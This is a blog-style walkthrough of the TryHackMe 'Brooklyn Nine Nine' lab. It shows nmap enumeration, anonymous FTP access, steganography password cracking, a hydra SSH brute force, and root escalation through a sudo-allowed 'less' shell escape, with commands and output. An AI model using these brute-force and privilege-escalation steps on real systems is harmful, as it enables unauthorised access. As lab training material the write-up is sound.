---
layout: post
title: THM Brooklyn Nine Nine WriteUp
date: 2025-01-05
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - OSCP
  - SSH-Brute-Force
  - Sudoers-Abusing
  - Steganography
  - FTP-Anon-Allowed
media_subpath: /assets/img/Brooklyn
---
![Desktop View](Brooklyn.jpeg){: w="400"  h="400" }



# Brooklyn Skills


>**Brooklyn** is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Web Tech's Enumeration**
- **FTP Anonymous User Allowed**
- **Steganography**
- **SSH Brute-Forcing**
- **Abusing Sudoers `less` Binary** 

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21, 22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.193.10 -oG allPorts
Nmap scan report for 10.10.193.10
Host is up, received user-set (0.28s latency).
Scanned at 2025-01-05 08:52:40 CET for 39s
Not shown: 39173 closed tcp ports (reset), 26359 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,22,80 10.10.193.10 -oN targeted
Nmap scan report for 10.10.193.10
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.116.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 21 --> vsftpd 3.0.3**
- **Port 22 --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3**
- **Port 80 --> Apache httpd 2.4.29**

Let's start with the Apache web server.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.193.10
http://10.10.193.10 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.193.10]
```

Nothing useful found, so let's take a look inside the website, once inside ***http://10.10.193.10***, we found a image that resizes automatically to any resolution.

![Desktop View](BrooklynMainPage.png)

Checking the source code we found a hint telling us: ***Have you ever heard of steganography?***, 

**Steganography Description**:

- Steganography is the practice of hiding information within other non-secret data, such as embedding a message, file, or image inside another file, like an image, video, or audio, in a way that conceals its existence. Unlike encryption, which makes the data unreadable without a key, steganography aims to make the hidden data undetectable to anyone unaware of its presence.

So i downloaded the image in order to check if it hides any secret info.

```bash
❯ wget http://10.10.193.10/brooklyn99.jpg
--2025-01-05 09:07:31--  http://10.10.193.10/brooklyn99.jpg
Connecting to 10.10.193.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg.1’

brooklyn99.jpg.1                               100%[==================================================================================================>]  68.05K   346KB/s    in 0.2s    

2025-01-05 09:07:31 (346 KB/s) - ‘brooklyn99.jpg.1’ saved [69685/69685]
```

Once with the file we can check if it hides something with a tool named `steghide`.

```bash
❯ steghide info brooklyn99.jpg
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
```

Indeed it is hiding something but is protected by password, so we have to crack the password of the embed file, we can use `stegseek` for that matter.

```bash
❯ stegseek brooklyn99.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

Passphrase found, the tool automatically retrieve the embed data, so we just have to open the file.

```bash
❯ catn brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Opening the file, we can see credentials for a user named **Holt**, we should be able to login with the following credentials: `holt:fluffydog12@ninenine`, so let's try to gain access via `ssh`.

```bash
❯ ssh holt@10.10.193.10
holt@10.10.193.10's password: fluffydog12@ninenine 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ whoami
holt
```

***This way to gain access was fun, but personally the way in was to much CTF-like, so let's gain access in a more "real scenario" way.***

## Port 21 Enumeration

The `nmap` scan showed us that we can access a file named `note_to_jake.txt`, so let's take a look.

```bash
❯ ftp 10.10.193.10
Connected to 10.10.193.10.
220 (vsFTPd 3.0.3)
Name (10.10.193.10:ne4rby): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Indeed we can login anonymously, so let's download the file.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||64892|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||27531|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*********************************************************************************************************************************************|   119       14.92 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (1.29 KiB/s)
ftp> 
```

After opening the file we can see that a sysadmin named **Amy** is telling **Jake** that his password is weak and he should change it ASAP.

```bash
❯ catn note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

We now have three possible users, so we can try brute-forcing the `ssh` service with those users.
## Gaining a Shell

Let's start with the user `Jake` that we know that holds a weak password, i will be using `hydra` for this purpose.

```bash
❯ hydra -l jake -P /usr/share/seclists/Passwords/probable-v2-top12000.txt ssh://10.10.193.10
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 09:34:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 12645 login tries (l:1/p:12645), ~791 tries per task
[DATA] attacking ssh://10.10.193.10:22/
[22][ssh] host: 10.10.193.10   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 09:34:51
```

Less than 5 seconds and we found valid credentials: `jake:987654321`, so let's get in via `ssh`.

```bash
❯ ssh jake@10.10.193.10
jake@10.10.193.10's password: 
Last login: Sun Jan  5 07:42:24 2025 from 10.11.116.52
jake@brookly_nine_nine:~$ whoami
jake
```

## Shell as Jake

Once inside, we can see the `user.txt` flag in the `holt` user home directory.

```bash
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11*****052e40********a060c23ee
```

Rapidly i found that the user `jake` is allowed to use the binary `less` as `root` without the requirement of a password.

```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Taking a quick look to [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo) i found that `less` allow us to inject commands while opening a file, so we just have to open any file as `root` and inject `!/bin/bash`.

```bash
jake@brookly_nine_nine:~$ sudo less /etc/passwd
WARNING: terminal is not fully functional
!/bin/bash
root@brookly_nine_nine:~# whoami
root
```

Now we can open the `root.txt` flag.

```bash
root@brookly_nine_nine:/root# cat root.txt 
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0e******050796b*****481845

Enjoy!!
```

---
## Final Thoughts

The **Brooklyn Nine Nine CTF** offered a unique and engaging experience, combining web enumeration with steganography to uncover hidden data. This creative approach, paired with privilege escalation, made it both entertaining and educational—an excellent way to enhance problem-solving and technical skills.

![Desktop View](BrooklynPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

